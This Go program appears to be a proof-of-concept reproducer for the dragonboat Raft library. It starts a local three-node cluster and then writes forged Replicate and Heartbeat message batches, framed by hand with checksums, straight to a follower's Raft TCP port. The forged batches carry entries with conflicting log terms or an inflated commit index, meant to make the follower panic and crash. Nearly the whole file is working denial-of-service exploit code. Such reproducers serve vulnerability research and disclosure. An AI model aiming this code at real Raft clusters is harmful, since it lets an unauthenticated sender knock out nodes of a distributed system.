// Command e2ereplicate starts a real three-node cluster, commits a couple of
// proposals, then writes forged Replicate batches to one follower's Raft
// address over TCP. The batches carry an entry whose Index points inside the
// follower's committed log with a term that cannot match, so
// entryLog.tryAppend panics on the exec-engine step worker.
package main

import (
	"context"
	"encoding/binary"
	"fmt"
	"hash/crc32"
	"io"
	"net"
	"os"
	"time"

	"github.com/lni/dragonboat/v3"
	"github.com/lni/dragonboat/v3/config"
	"github.com/lni/dragonboat/v3/raftio"
	pb "github.com/lni/dragonboat/v3/raftpb"
	sm "github.com/lni/dragonboat/v3/statemachine"
)

type testSM struct {
	count uint64
}

func (s *testSM) Update(data []byte) (sm.Result, error) {
	s.count++
	return sm.Result{Value: s.count}, nil
}

func (s *testSM) Lookup(interface{}) (interface{}, error) { return s.count, nil }

func (s *testSM) SaveSnapshot(w io.Writer, _ sm.ISnapshotFileCollection,
	_ <-chan struct{}) error {
	return nil
}

func (s *testSM) RecoverFromSnapshot(io.Reader, []sm.SnapshotFile,
	<-chan struct{}) error {
	return nil
}

func (s *testSM) Close() error { return nil }

func writeFrame(conn net.Conn, payload []byte) error {
	magic := []byte{0xAE, 0x7D}
	hdr := make([]byte, 18)
	binary.BigEndian.PutUint16(hdr, 100) // raftType
	binary.BigEndian.PutUint64(hdr[2:], uint64(len(payload)))
	binary.BigEndian.PutUint32(hdr[14:], crc32.ChecksumIEEE(payload))
	binary.BigEndian.PutUint32(hdr[10:], 0)
	binary.BigEndian.PutUint32(hdr[10:], crc32.ChecksumIEEE(hdr))
	if _, err := conn.Write(magic); err != nil {
		return err
	}
	if _, err := conn.Write(hdr); err != nil {
		return err
	}
	_, err := conn.Write(payload)
	return err
}

func main() {
	mode := "replicate"
	if len(os.Args) > 1 {
		mode = os.Args[1]
	}
	const clusterID = uint64(128)
	addrs := map[uint64]string{
		1: "127.0.0.1:26991",
		2: "127.0.0.1:26992",
		3: "127.0.0.1:26993",
	}
	hosts := make(map[uint64]*dragonboat.NodeHost)
	for id, addr := range addrs {
		dir, err := os.MkdirTemp("", "e2ereplicate")
		if err != nil {
			panic(err)
		}
		defer os.RemoveAll(dir)
		nh, err := dragonboat.NewNodeHost(config.NodeHostConfig{
			NodeHostDir:    dir,
			WALDir:         dir,
			RTTMillisecond: 10,
			RaftAddress:    addr,
		})
		if err != nil {
			panic(err)
		}
		defer nh.Stop()
		hosts[id] = nh
	}
	createSM := func(uint64, uint64) sm.IStateMachine { return &testSM{} }
	for id, nh := range hosts {
		if err := nh.StartCluster(addrs, false, createSM, config.Config{
			ClusterID:    clusterID,
			NodeID:       id,
			ElectionRTT:  10,
			HeartbeatRTT: 1,
		}); err != nil {
			panic(err)
		}
	}
	proposed := false
	deadline := time.Now().Add(20 * time.Second)
	for i := 0; i < 200 && !proposed && time.Now().Before(deadline); i++ {
		for id, nh := range hosts {
			ctx, cancel := context.WithTimeout(context.Background(), 200*time.Millisecond)
			_, err := nh.SyncPropose(ctx, nh.GetNoOPSession(clusterID), []byte("x"))
			cancel()
			if err == nil {
				fmt.Printf("proposal %d committed via node %d\n", i, id)
				proposed = true
				break
			}
		}
		if !proposed {
			time.Sleep(100 * time.Millisecond)
		}
	}
	if !proposed {
		panic("no proposal could be committed")
	}
	time.Sleep(500 * time.Millisecond)

	conn, err := net.Dial("tcp", addrs[2])
	if err != nil {
		panic(err)
	}
	defer conn.Close()
	if mode == "heartbeat" {
		batch := pb.MessageBatch{
			BinVer:       raftio.TransportBinVersion,
			DeploymentId: 1,
			Requests: []pb.Message{{
				ClusterId: clusterID,
				From:      1,
				To:        2,
				Type:      pb.Heartbeat,
				Term:      1000,
				Commit:    1 << 40,
			}},
		}
		payload, err := batch.Marshal()
		if err != nil {
			panic(err)
		}
		if err := writeFrame(conn, payload); err != nil {
			panic(err)
		}
		fmt.Println("sent one forged Heartbeat batch")
		time.Sleep(3 * time.Second)
		fmt.Println("NODEHOSTS SURVIVED THE FORGED HEARTBEAT BATCH")
		return
	}
	sent := 0
	for li := uint64(1); li <= 40; li++ {
		for lt := uint64(1); lt <= 12; lt++ {
			batch := pb.MessageBatch{
				BinVer:       raftio.TransportBinVersion,
				DeploymentId: 1, // the NodeHost default, not a secret
				Requests: []pb.Message{{
					ClusterId: clusterID,
					From:      1,
					To:        2,
					Type:      pb.Replicate,
					Term:      1000,
					LogIndex:  li,
					LogTerm:   lt,
					Entries: []pb.Entry{{
						Index: li - 1,
						Term:  77,
						Type:  pb.ApplicationEntry,
					}},
				}},
			}
			payload, err := batch.Marshal()
			if err != nil {
				panic(err)
			}
			if err := writeFrame(conn, payload); err != nil {
				break
			}
			sent++
			time.Sleep(2 * time.Millisecond)
		}
	}
	fmt.Printf("sent %d forged Replicate batches\n", sent)
	time.Sleep(3 * time.Second)
	fmt.Println("NODEHOSTS SURVIVED THE FORGED REPLICATE BATCHES")
}
